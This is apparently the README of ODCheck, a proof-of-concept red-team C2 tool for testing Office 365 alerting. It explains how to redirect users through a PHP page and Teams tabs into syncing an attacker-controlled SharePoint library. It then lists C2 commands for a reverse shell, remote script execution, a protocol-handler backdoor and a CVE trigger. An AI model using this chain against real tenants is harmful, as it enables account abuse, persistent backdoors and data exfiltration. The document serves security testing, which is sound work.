# ODCheck

ODCheck is a C2-like proof-of-concept solution designed to empower security professionals in evaluating their alerting systems against specific cyber-attacks within the Office 365 environment. This tool simplifies the process of testing local security solutions, particularly in scenarios involving data exfiltration through OneDrive and Sharepoint traffic.
<br/><br/>

| MITRE Technique             | ID |
| :---------------- | :------: |
| Exfiltration over C2 Channel        |   [T1041](https://attack.mitre.org/techniques/T1041/)   |
| Masquerading: Right-to-Left Override            |   [T1036.002](https://attack.mitre.org/techniques/T1036/002/)   |
| Modify Registry    |  [T1112](https://attack.mitre.org/techniques/T1112/)   |
| Automated Collection |  [T1119](https://attack.mitre.org/techniques/T1119/)   |
<br/>

 **Setting Up ODCheck**
 
```
# You will need to have the PS2EXE PowerShell module installed 
Install-Module PS2EXE

# Copy the full ODCheck Folder from Github
git clone https://github.com/itssixtyn3in/ODCheck

# Run Manager.ps1 to start the Wizard
.\manager.ps1
```
ODCheck provides a few customization options from here that can be used, depending on what all you want to test.

- Option 1) This will customize the variables of the files that ODCheck will watch out for when the agent has been executed on a host. The setup will also require that you know the tenant and document library name that you will be using for the mutual sync connection. When setting up a document library that can be 

- Option 2) Inject a file name with the Right-To-Left-Override character to spoof the file extension.

- Option 3) Packages the script into an EXE file.
 <br/><br/>

 **Customizing the ODCheck Commands**
 The ODCheck client has been set up with five commands out of the box, but for the full functionality you will want to edit some of the commands to work for your needs (change the IP for the listener etc)
  <br/><br/>
 **Establishing A Sync Connection**
 
 The Microsoft Teams client in it's default configuration allows users to add website tabs to private conversations, or Teams channels. The website tab option can be linked to external pages, which can be used as a jumping point to have users sync specific Sharepoint libraries using the ODOpen:// protocol handler. For further details regarding this please see https://www.collectingflags.com

 If you've taken over a Office 365 account and can create Sharepoint Sites and write Microsoft Teams messages, then you can retrieve the ODSync link the following way. 
- Create a new sharepoint library and upload a file
- In a browser open up your dev tools > network > click on the 'sync' button on the Sharepoint page to trigger the ODOpen command
- Cope the URL from the network section entry
  
 ![onedrive_link-1024x231](https://github.com/itssixtyn3in/ODCheck/assets/130003354/40d0c5a7-c598-4a7f-adfb-349c533b7724)


 Your link for the sync connection will look similar to this:
 ```
 odopen://sync?userId=&userEmail=user%40email%2Ecom&isSiteAdmin=1&siteId=%7B123456e2%2D77be%2D4e43%2D9301%2D2d6cc8d5f778%7D&webId=%7B88af89a5%2D547e%2D44e5%2Dbab9%2Dcf1b27958693%7D&webTitle=OneDriveHealthCheck&webTemplate=64&webLogoUrl=%2Fsites%2FOneDriveHealthCheck2%2F%5Fapi%2FGroupService%2FGetGroupImage%3Fid%3D%27bdbb85bc%2D127a%2D4d63%2D95a6%2Dadaaf1394c1b%27%26hash%3D638490900916829775&webUrl=https%3A%2F%2Fexample%2Esharepoint%2Ecom%2Fsites%2FOneDriveHealthCheck2&onPrem=0&libraryType=3&listId=95e13011%2D92c1%2D488b%2Db46f%2D6d7b7b31fe0b&listTitle=Documents&scope=OPENLIST
```
Upload the ODOpen URL in a PHP file on a webhost that you control. The PHP file content should look like the following:
```
<?php
header("Location: odopen://sync?userId=&userEmail=user%40email%2Ecom&isSiteAdmin=1&siteId=%7B123456e2%2D77be%2D4e43%2D9301%2D2d6cc8d5f778%7D&webId=%7B88af89a5%2D547e%2D44e5%2Dbab9%2Dcf1b27958693%7D&webTitle=OneDriveHealthCheck&webTemplate=64&webLogoUrl=%2Fsites%2FOneDriveHealthCheck2%2F%5Fapi%2FGroupService%2FGetGroupImage%3Fid%3D%27bdbb85bc%2D127a%2D4d63%2D95a6%2Dadaaf1394c1b%27%26hash%3D638490900916829775&webUrl=https%3A%2F%2Fexample%2Esharepoint%2Ecom%2Fsites%2FOneDriveHealthCheck2&onPrem=0&libraryType=3&listId=95e13011%2D92c1%2D488b%2Db46f%2D6d7b7b31fe0b&listTitle=Documents&scope=OPENLIST", true, 301);
exit;
?>
```
 Once this sync has been established, then ODCheck can assist with creating a C2 connection. 
<br/><br/>
**Running commands**

Once a sync connection has been set up to the Sharepoint Document Library and the ODCheck client has been executed, then commands can be executed by dropping the payload files into the shared sync folder. 

- Enumeration: Runs multiple Windows enumeration commands and returns the output into the sync folder.
- Reverse Shell: Attempts to run a powershell base64 encoded reverse shell
- Execute remote Powershell script: Attempts executing a remote powershell script
- Install ODCheck protocol handler: Install the ODCheck protocol handler as a backdoor that can be triggered with odcheck://
- Trigger CVE-2023-32214: Attempts to run the MS-CXH-FULL protocol handler to cause a black screen condition.

https://github.com/itssixtyn3in/ODCheck/assets/130003354/36ea337f-ed2c-427e-9d4e-9628c812404f

